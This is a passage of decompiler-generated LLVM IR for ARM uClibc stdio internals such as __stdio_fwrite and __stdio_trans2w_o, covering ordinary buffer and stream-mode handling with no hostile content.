  store i32 %v2_14e68, i32* %r3.global-to-local, align 4
  %v1_14e6c = load i32, i32* @r5, align 4
  %v2_14e6c = sub i32 %v1_14e6c, %v2_14e68
  br label %dec_label_pc_14e70

dec_label_pc_14e70:                               ; preds = %dec_label_pc_14e04.dec_label_pc_14e70_crit_edge, %dec_label_pc_14e60
  %v0_14e70 = phi i32 [ %v0_14e70.pre, %dec_label_pc_14e04.dec_label_pc_14e70_crit_edge ], [ %v2_14e6c, %dec_label_pc_14e60 ]
  %v1_14e70 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e70 = sub i32 %v1_14e70, %v0_14e70
  store i32 %v2_14e70, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14e74

dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge: ; preds = %dec_label_pc_14dd4thread-pre-split
  %v0_14e74.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %entry, %dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge, %dec_label_pc_14e70
  %v0_14e74 = phi i32 [ %v2_14e70, %dec_label_pc_14e70 ], [ %v0_14e74.pre.pre, %dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_14e74, i32* %r0.global-to-local, align 4
  store i32 %v9_14dc0, i32* @r6, align 4
  ret i32 %v0_14e74

; uselistorder directives
  uselistorder i32 %v0_14e74, { 1, 0 }
  uselistorder i32 %v0_14e60, { 1, 0 }
  uselistorder i32 %v1_14e58, { 0, 2, 1 }
  uselistorder i32 %v0_14e54, { 1, 0 }
  uselistorder i1 %v2_14e4c, { 1, 0 }
  uselistorder i32 %v1_14e40, { 1, 0 }
  uselistorder i32 %v0_14e28, { 1, 0, 2 }
  uselistorder i32 %v5_14e0c, { 1, 0 }
  uselistorder i32 %v2_14e0c, { 1, 0, 2 }
  uselistorder i32 %v0_14df4, { 1, 0 }
  uselistorder i32 %v3_14dec, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_14de4, { 1, 0 }
  uselistorder i32 %v5_14dfc, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__libc_write, { 1, 11, 10, 9, 8, 0, 7, 5, 6, 3, 4, 12, 2 }
  uselistorder label %dec_label_pc_14e74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14e70, { 1, 0 }
  uselistorder label %dec_label_pc_14e60, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_14de0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14e7c = load i32, i32* @r4, align 4
  store i32 %v3_14e7c, i32* %stack_var_-20, align 4
  %v6_14e7c = load i32, i32* @r5, align 4
  %v9_14e7c = load i32, i32* @r6, align 4
  %v12_14e7c = load i32, i32* @r7, align 4
  %v15_14e7c = load i32, i32* @lr, align 4
  %v1_14e80 = add i32 %arg3, 1
  %v2_14e80 = inttoptr i32 %v1_14e80 to i8*
  %v3_14e80 = load i8, i8* %v2_14e80, align 1
  %v4_14e80 = zext i8 %v3_14e80 to i32
  %v3_14e84 = mul nuw nsw i32 %v4_14e80, 256
  %v1_14e88 = and i32 %v3_14e84, 512
  store i32 %v1_14e88, i32* @r4, align 4
  %v2_14e88 = icmp eq i32 %v1_14e88, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14e88, label %dec_label_pc_14e9c, label %dec_label_pc_14f98

dec_label_pc_14e9c:                               ; preds = %entry
  %v1_14e9c = add i32 %arg3, 4
  %v2_14e9c = inttoptr i32 %v1_14e9c to i32*
  %v3_14e9c = load i32, i32* %v2_14e9c, align 4
  %v1_14ea4 = add i32 %arg3, 16
  %v2_14ea4 = inttoptr i32 %v1_14ea4 to i32*
  %v3_14ea4 = load i32, i32* %v2_14ea4, align 4
  store i32 %v3_14ea4, i32* @r0, align 4
  %v1_14ea8 = add i32 %arg3, 12
  %v2_14ea8 = inttoptr i32 %v1_14ea8 to i32*
  %v3_14ea8 = load i32, i32* %v2_14ea8, align 4
  %v4_14eac = icmp eq i32 %v3_14e9c, -2
  %v2_14eb0 = sub i32 %v3_14ea8, %v3_14ea4
  br i1 %v4_14eac, label %dec_label_pc_14eb0, label %dec_label_pc_14ed8

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e9c
  %v3_14eb4 = icmp ugt i32 %v2_14eb0, %arg2
  br i1 %v3_14eb4, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_14eb0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_14eb0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_14eb0, %dec_label_pc_14eb0 ]
  %v0_14ebc = phi i32 [ %arg2, %bb ], [ %v2_14eb0, %dec_label_pc_14eb0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_14ebc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_14ec4 = call i32 @memcpy()
  %v0_14ec8 = load i32, i32* @r5, align 4
  %v1_14ec8 = add i32 %v0_14ec8, 16
  %v2_14ec8 = inttoptr i32 %v1_14ec8 to i32*
  %v3_14ec8 = load i32, i32* %v2_14ec8, align 4
  %v1_14ecc = load i32, i32* @r4, align 4
  %v2_14ecc = add i32 %v1_14ecc, %v3_14ec8
  store i32 %v2_14ecc, i32* %v2_14ec8, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14ed8:                               ; preds = %dec_label_pc_14e9c
  %tmp = icmp ult i32 %v2_14eb0, %arg2
  br i1 %tmp, label %dec_label_pc_14f78, label %dec_label_pc_14ee4

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ed8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_14eec = call i32 @memcpy()
  %v0_14ef0 = load i32, i32* @r5, align 4
  %v1_14ef0 = add i32 %v0_14ef0, 16
  %v2_14ef0 = inttoptr i32 %v1_14ef0 to i32*
  %v3_14ef0 = load i32, i32* %v2_14ef0, align 4
  %v1_14ef4 = add i32 %v0_14ef0, 1
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i8*
  %v3_14ef4 = load i8, i8* %v2_14ef4, align 1
  %v1_14ef8 = load i32, i32* @r6, align 4
  %v2_14ef8 = add i32 %v1_14ef8, %v3_14ef0
  %tmp17 = urem i8 %v3_14ef4, 2
  %v2_14efc = icmp eq i8 %tmp17, 0
  store i32 %v2_14ef8, i32* %v2_14ef0, align 4
  br i1 %v2_14efc, label %dec_label_pc_14fac, label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14ee4
  %v0_14f08 = load i32, i32* %r7.global-to-local, align 4
  %v0_14f10 = load i32, i32* @r6, align 4
  %v4_14f14 = call i32 @memrchr(i32 %v0_14f08, i32 10, i32 %v0_14f10, i32 %v2_14ef8)
  %v2_14f18 = icmp eq i32 %v4_14f14, 0
  br i1 %v2_14f18, label %dec_label_pc_14fac, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14f08
  %v0_14f20 = load i32, i32* @r5, align 4
  store i32 %v0_14f20, i32* @r0, align 4
  %v0_14f24 = call i32 @__stdio_wcommit()
  %v2_14f28 = icmp eq i32 %v0_14f24, 0
  br i1 %v2_14f28, label %dec_label_pc_14fac, label %dec_label_pc_14f30

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14f20
  %v0_14f30 = load i32, i32* @r6, align 4
  %v3_14f30 = icmp uge i32 %v0_14f30, %v0_14f24
  %v0_14f24.v0_14f30 = select i1 %v3_14f30, i32 %v0_14f24, i32 %v0_14f30
  store i32 %v0_14f24.v0_14f30, i32* @r4, align 4
  %v2_14f3c = sub i32 %v0_14f30, %v0_14f24.v0_14f30
  %v0_14f40 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f40 = add i32 %v0_14f40, %v2_14f3c
  store i32 %v2_14f40, i32* %r7.global-to-local, align 4
  store i32 %v0_14f24.v0_14f30, i32* @r2, align 4
  %v4_14f50 = call i32 @__GI_memchr(i32 %v2_14f40, i32 10, i32 %v0_14f24.v0_14f30, i32 %v2_14f3c)
  %v2_14f54 = icmp eq i32 %v4_14f50, 0
  br i1 %v2_14f54, label %dec_label_pc_14fac, label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f30
  %v0_14f5c = load i32, i32* @r5, align 4
  %v1_14f5c = add i32 %v0_14f5c, 16
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  %v0_14f60 = load i32, i32* %r7.global-to-local, align 4
  %v1_14f60 = load i32, i32* @r4, align 4
  %v2_14f60 = sub i32 %v0_14f60, %v4_14f50
  %v2_14f64 = add i32 %v2_14f60, %v1_14f60
  %v2_14f68 = sub i32 %v3_14f5c, %v2_14f64
  %v1_14f6c = load i32, i32* @r6, align 4
  %v2_14f6c = sub i32 %v1_14f6c, %v2_14f64
  store i32 %v2_14f6c, i32* @r6, align 4
  store i32 %v2_14f68, i32* %v2_14f5c, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14ed8
  %v1_14f78 = add i32 %arg3, 8
  %v2_14f78 = inttoptr i32 %v1_14f78 to i32*
  %v3_14f78 = load i32, i32* %v2_14f78, align 4
  %v9_14f7c = icmp eq i32 %v3_14ea4, %v3_14f78
  br i1 %v9_14f7c, label %dec_label_pc_14f98, label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f78
  store i32 %arg3, i32* @r0, align 4
  %v0_14f88 = call i32 @__stdio_wcommit()
  %v2_14f8c = icmp eq i32 %v0_14f88, 0
  br i1 %v2_14f8c, label %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge, label %bb13

dec_label_pc_14f84.dec_label_pc_14f98_crit_edge:  ; preds = %dec_label_pc_14f84
  %v0_14fa0.pre = load i32, i32* @r6, align 4
  %v0_14f98.pre = load i32, i32* @r5, align 4
  %v0_14f9c.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_14fa4.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_14f98

bb13:                                             ; preds = %dec_label_pc_14f84
  %v1_14f90 = load i32, i32* @r4, align 4
  store i32 %v1_14f90, i32* @r6, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14f98:                               ; preds = %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge, %entry, %dec_label_pc_14f78
  %v2_14fa4 = phi i32 [ %v2_14fa4.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %v3_14e7c, %entry ], [ %v3_14e7c, %dec_label_pc_14f78 ]
  %v0_14f9c = phi i32 [ %v0_14f9c.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_14f78 ]
  %v0_14f98 = phi i32 [ %v0_14f98.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_14f78 ]
  %v0_14fa0 = phi i32 [ %v0_14fa0.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_14f78 ]
  store i32 %v2_14fa4, i32* @r4, align 4
  store i32 %v6_14e7c, i32* @r5, align 4
  store i32 %v9_14e7c, i32* @r6, align 4
  store i32 %v15_14e7c, i32* @lr, align 4
  %v3_14fa8 = inttoptr i32 %v0_14f98 to i8*
  %v4_14fa8 = call i32 @__stdio_WRITE(i8* %v3_14fa8, i32 %v0_14f9c, i32 %v0_14fa0)
  br label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %bb13, %dec_label_pc_14f30, %dec_label_pc_14f20, %dec_label_pc_14f08, %dec_label_pc_14ee4, %dec_label_pc_14f5c, %bb10, %dec_label_pc_14f98
  %v0_14fac = load i32, i32* @r6, align 4
  %v2_14fb0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14fb0, i32* @r4, align 4
  store i32 %v6_14e7c, i32* @r5, align 4
  store i32 %v9_14e7c, i32* @r6, align 4
  store i32 %v12_14e7c, i32* @r7, align 4
  ret i32 %v0_14fac

; uselistorder directives
  uselistorder i32 %v2_14f64, { 1, 0 }
  uselistorder i32 %v2_14f3c, { 1, 0 }
  uselistorder i32 %v0_14f24.v0_14f30, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14f30, { 1, 0, 2 }
  uselistorder i32 %v2_14eb0, { 2, 0, 1, 3 }
  uselistorder i32 %v9_14e7c, { 1, 0 }
  uselistorder i32 %v6_14e7c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %arg3, { 0, 1, 8, 2, 5, 4, 7, 3, 6 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14fac, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_14f98, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14fb4 = load i32, i32* @r4, align 4
  store i32 %v3_14fb4, i32* %stack_var_-8, align 4
  %v3_14fb8 = load i8, i8* %arg1, align 1
  %v4_14fb8 = zext i8 %v3_14fb8 to i32
  store i32 %v4_14fb8, i32* %r2.global-to-local, align 4
  %v2_14fbc = add i32 %tmp, 1
  %v3_14fbc = inttoptr i32 %v2_14fbc to i8*
  %v4_14fbc = load i8, i8* %v3_14fbc, align 1
  %v5_14fbc = zext i8 %v4_14fbc to i32
  store i32 %v5_14fbc, i32* %r3.global-to-local, align 4
  %v4_14fc0 = mul nuw nsw i32 %v5_14fbc, 256
  %v5_14fc0 = or i32 %v4_14fc0, %v4_14fb8
  store i32 %v5_14fc0, i32* %r2.global-to-local, align 4
  %v2_14fc4 = and i32 %v5_14fc0, %arg2
  %v4_14fc4 = icmp eq i32 %v2_14fc4, 0
  store i1 %v4_14fc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_14fc4, label %dec_label_pc_14fd0, label %dec_label_pc_14fe8

dec_label_pc_14fd0:                               ; preds = %entry
  %v1_14fd0 = and i32 %v5_14fc0, 2176
  %v2_14fd0 = icmp eq i32 %v1_14fd0, 0
  store i1 %v2_14fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fd0, label %dec_label_pc_14fd8, label %dec_label_pc_14ffc

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fd0
  %v2_14fd8 = or i32 %v5_14fc0, %arg2
  store i32 %v2_14fd8, i32* %r2.global-to-local, align 4
  %v3_14fdc = sdiv i32 %v2_14fd8, 256
  store i32 %v3_14fdc, i32* %r3.global-to-local, align 4
  %v1_14fe0 = trunc i32 %v3_14fdc to i8
  store i8 %v1_14fe0, i8* %v3_14fbc, align 1
  %v0_14fe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fe4 = trunc i32 %v0_14fe4 to i8
  store i8 %v1_14fe4, i8* %arg1, align 1
  %v0_14fe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %entry, %dec_label_pc_14fd8
  %v0_15034 = phi i32 [ %tmp, %entry ], [ %v0_14fe8.pre, %dec_label_pc_14fd8 ]
  %v1_14fe8 = inttoptr i32 %v0_15034 to i8*
  %v2_14fe8 = load i8, i8* %v1_14fe8, align 1
  %v3_14fe8 = zext i8 %v2_14fe8 to i32
  store i32 %v3_14fe8, i32* %r2.global-to-local, align 4
  %v1_14fec = add i32 %v0_15034, 1
  %v2_14fec = inttoptr i32 %v1_14fec to i8*
  %v3_14fec = load i8, i8* %v2_14fec, align 1
  %v4_14fec = zext i8 %v3_14fec to i32
  store i32 %v4_14fec, i32* %r3.global-to-local, align 4
  %v4_14ff0 = mul nuw nsw i32 %v4_14fec, 256
  %v1_14ff4 = and i32 %v3_14fe8, 32
  %v2_14ff4 = icmp eq i32 %v1_14ff4, 0
  store i1 %v2_14ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ff4, label %dec_label_pc_15024, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14fd0, %dec_label_pc_14fe8
  %v0_14ffc = call i32 @__errno_location()
  store i32 %v0_14ffc, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_15004 = inttoptr i32 %v0_14ffc to i32*
  store i32 9, i32* %v2_15004, align 4
  br label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %dec_label_pc_1504c, %dec_label_pc_14ffc
  %v0_15008 = load i32, i32* @r4, align 4
  %v1_15008 = inttoptr i32 %v0_15008 to i32*
  %v2_15008 = load i32, i32* %v1_15008, align 4
  %v1_1500c = or i32 %v2_15008, 8
  store i32 %v1_1500c, i32* %r3.global-to-local, align 4
  %v3_15010 = sdiv i32 %v2_15008, 256
  store i32 %v3_15010, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15018 = trunc i32 %v3_15010 to i8
  %v3_15018 = add i32 %v0_15008, 1
  %v4_15018 = inttoptr i32 %v3_15018 to i8*
  store i8 %v1_15018, i8* %v4_15018, align 1
  %v0_1501c = load i32, i32* %r3.global-to-local, align 4
  %v1_1501c = trunc i32 %v0_1501c to i8
  %v2_1501c = load i32, i32* @r4, align 4
  %v3_1501c = inttoptr i32 %v2_1501c to i8*
  store i8 %v1_1501c, i8* %v3_1501c, align 1
  %v2_15020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15020, i32* @r4, align 4
  ret i32 -1

dec_label_pc_15024:                               ; preds = %dec_label_pc_14fe8
  %tmp15 = urem i8 %v2_14fe8, 4
  %v2_15024 = icmp eq i8 %tmp15, 0
  store i1 %v2_15024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15024, label %dec_label_pc_15088, label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15024
  %v1_1502c = and i32 %v3_14fe8, 4
  store i32 %v1_1502c, i32* @r1, align 4
  %v2_1502c = icmp eq i32 %v1_1502c, 0
  store i1 %v2_1502c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1502c, label %dec_label_pc_15034, label %dec_label_pc_15064

dec_label_pc_15034:                               ; preds = %dec_label_pc_1502c
  %v1_15034 = add i32 %v0_15034, 20
  %v2_15034 = inttoptr i32 %v1_15034 to i32*
  %v3_15034 = load i32, i32* %v2_15034, align 4
  store i32 %v3_15034, i32* %r2.global-to-local, align 4
  %v1_15038 = add i32 %v0_15034, 16
  %v2_15038 = inttoptr i32 %v1_15038 to i32*
  %v3_15038 = load i32, i32* %v2_15038, align 4
  store i32 %v3_15038, i32* %r3.global-to-local, align 4
  %v9_1503c = icmp eq i32 %v3_15034, %v3_15038
  store i1 %v9_1503c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1503c, label %dec_label_pc_15044, label %dec_label_pc_1504c

dec_label_pc_15044:                               ; preds = %dec_label_pc_15034
  %v1_15044 = and i32 %v3_14fe8, 2
  %v2_15044 = icmp eq i32 %v1_15044, 0
  store i1 %v2_15044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15044, label %dec_label_pc_15064, label %dec_label_pc_1504c

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15034, %dec_label_pc_15044
  %v1_1504c = and i32 %v4_14ff0, 1024
  %v2_1504c = icmp eq i32 %v1_1504c, 0
  store i1 %v2_1504c, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_1504c, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_15058 = call i32 @__GI_fseek()
  store i32 %v0_15058, i32* %r0.global-to-local, align 4
  %v2_1505c = icmp eq i32 %v0_15058, 0
  store i1 %v2_1505c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1505c, label %.dec_label_pc_15064_crit_edge, label %dec_label_pc_15008

.dec_label_pc_15064_crit_edge:                    ; preds = %dec_label_pc_1504c
  %v0_15064.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %.dec_label_pc_15064_crit_edge, %dec_label_pc_1502c, %dec_label_pc_15044
  %v2_15074 = phi i32 [ %v0_15064.pre, %.dec_label_pc_15064_crit_edge ], [ %v0_15034, %dec_label_pc_1502c ], [ %v0_15034, %dec_label_pc_15044 ]
  %v1_15064 = inttoptr i32 %v2_15074 to i32*
  %v2_15064 = load i32, i32* %v1_15064, align 4
  store i32 %v2_15064, i32* %r3.global-to-local, align 4
  %v1_15068 = add i32 %v2_15074, 8
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  %v3_15068 = load i32, i32* %v2_15068, align 4
  store i32 %v3_15068, i32* %r1.global-to-local, align 4
  %v1_1506c = and i32 %v2_15064, -4
  store i32 %v1_1506c, i32* %r3.global-to-local, align 4
  %v3_15070 = sdiv i32 %v2_15064, 256
  store i32 %v3_15070, i32* %r2.global-to-local, align 4
  %v1_15074 = trunc i32 %v3_15070 to i8
  %v3_15074 = add i32 %v2_15074, 1
  %v4_15074 = inttoptr i32 %v3_15074 to i8*
  store i8 %v1_15074, i8* %v4_15074, align 1
  %v0_15078 = load i32, i32* %r1.global-to-local, align 4
  %v1_15078 = load i32, i32* @r4, align 4
  %v2_15078 = add i32 %v1_15078, 20
  %v3_15078 = inttoptr i32 %v2_15078 to i32*
  store i32 %v0_15078, i32* %v3_15078, align 4
  %v0_1507c = load i32, i32* %r3.global-to-local, align 4
  %v1_1507c = trunc i32 %v0_1507c to i8
  %v2_1507c = load i32, i32* @r4, align 4
  %v3_1507c = inttoptr i32 %v2_1507c to i8*
  store i8 %v1_1507c, i8* %v3_1507c, align 1
  %v0_15080 = load i32, i32* %r1.global-to-local, align 4
  %v1_15080 = load i32, i32* @r4, align 4
  %v2_15080 = add i32 %v1_15080, 24
  %v3_15080 = inttoptr i32 %v2_15080 to i32*
  store i32 %v0_15080, i32* %v3_15080, align 4
  %v0_15084 = load i32, i32* %r1.global-to-local, align 4
  %v1_15084 = load i32, i32* @r4, align 4
  %v2_15084 = add i32 %v1_15084, 16
  %v3_15084 = inttoptr i32 %v2_15084 to i32*
  store i32 %v0_15084, i32* %v3_15084, align 4
  %v0_15088.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_15024, %dec_label_pc_15064
  %v2_15094 = phi i32 [ %v0_15034, %dec_label_pc_15024 ], [ %v0_15088.pre, %dec_label_pc_15064 ]
  %v1_15088 = inttoptr i32 %v2_15094 to i32*
  %v2_15088 = load i32, i32* %v1_15088, align 4
  %v1_1508c = or i32 %v2_15088, 64
  store i32 %v1_1508c, i32* %r2.global-to-local, align 4
  %v3_15090 = sdiv i32 %v2_15088, 256
  store i32 %v3_15090, i32* %r3.global-to-local, align 4
  %v1_15094 = trunc i32 %v3_15090 to i8
  %v3_15094 = add i32 %v2_15094, 1
  %v4_15094 = inttoptr i32 %v3_15094 to i8*
  store i8 %v1_15094, i8* %v4_15094, align 1
  %v0_15098 = load i32, i32* @r4, align 4
  %v1_15098 = add i32 %v0_15098, 1
  %v2_15098 = inttoptr i32 %v1_15098 to i8*
  %v3_15098 = load i8, i8* %v2_15098, align 1
  %v4_15098 = zext i8 %v3_15098 to i32
  %v3_1509c = mul nuw nsw i32 %v4_15098, 256
  store i32 %v3_1509c, i32* %r3.global-to-local, align 4
  %v1_150a0 = and i32 %v3_1509c, 2816
  store i32 %v1_150a0, i32* %r0.global-to-local, align 4
  %v2_150a0 = icmp eq i32 %v1_150a0, 0
  store i1 %v2_150a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150a0, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_15088
  %v2_150a4 = add i32 %v0_15098, 12
  %v3_150a4 = inttoptr i32 %v2_150a4 to i32*
  %v4_150a4 = load i32, i32* %v3_150a4, align 4
  store i32 %v4_150a4, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_15088
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_150ac = load i32, i32* %r2.global-to-local, align 4
  %v1_150ac = trunc i32 %v0_150ac to i8
  %v3_150ac = inttoptr i32 %v0_15098 to i8*
  store i8 %v1_150ac, i8* %v3_150ac, align 1
  %v0_150b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_150b0, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_150b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_150b0 = load i32, i32* @r4, align 4
  %v3_150b0 = add i32 %v2_150b0, 28
  %v4_150b0 = inttoptr i32 %v3_150b0 to i32*
  store i32 %v1_150b0, i32* %v4_150b0, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_150b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_150b4, i32* @r4, align 4
  %v8_150b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_150b4

; uselistorder directives
  uselistorder i32 %v3_1509c, { 1, 0 }
  uselistorder i32 %v3_15090, { 1, 0 }
  uselistorder i32 %v3_15070, { 1, 0 }
  uselistorder i32 %v2_15074, { 0, 2, 1 }
  uselistorder i1 %v2_15024, { 1, 0 }
  uselistorder i32 %v3_15010, { 1, 0 }
  uselistorder i32 %v0_15034, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_14fdc, { 1, 0 }
  uselistorder i32 %v5_14fc0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_15088, { 1, 0 }
  uselistorder label %dec_label_pc_15064, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1504c, { 1, 0 }
  uselistorder label %dec_label_pc_14ffc, { 1, 0 }
  uselistorder label %dec_label_pc_14fe8, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_150b8 = load i32, i32* @r2, align 4
  %v1_150b8 = icmp slt i32 %v0_150b8, 0
  %v0_150bc = load i32, i32* @r0, align 4
  %v1_150c0 = and i32 %v0_150bc, 2048
  %v2_150f4 = icmp eq i32 %v1_150c0, 0
  br i1 %v1_150b8, label %dec_label_pc_150f4, label %dec_label_pc_150c8

dec_label_pc_150c8:                               ; preds = %entry
  br i1 %v2_150f4, label %dec_label_pc_150d0, label %dec_label_pc_150fc

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150c8
  %v7_150d0 = icmp eq i32 %v0_150bc, 256
  %v0_150d4 = load i32, i32* @r1, align 4
  %v1_150d4 = inttoptr i32 %v0_150d4 to i32*
  %v2_150d4 = load i32, i32* %v1_150d4, align 4
  %v2_150d8 = urem i32 %v2_150d4, 256
  %v2_150d8.v2_150d4 = select i1 %v7_150d0, i32 %v2_150d8, i32 %v2_150d4
  br i1 %v7_150d0, label %.thread, label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150d0
  %v7_150e0 = icmp eq i32 %v0_150bc, 512
  br i1 %v7_150e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_150e0
  %v4_150e8 = urem i32 %v2_150d8.v2_150d4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_150e0, %dec_label_pc_150d0, %bb
  %v1_150f0 = phi i32 [ %v2_150d4, %dec_label_pc_150e0 ], [ %v2_150d8, %dec_label_pc_150d0 ], [ %v4_150e8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_150f0

dec_label_pc_150f4:                               ; preds = %entry
  br i1 %v2_150f4, label %dec_label_pc_15104, label %dec_label_pc_150fc

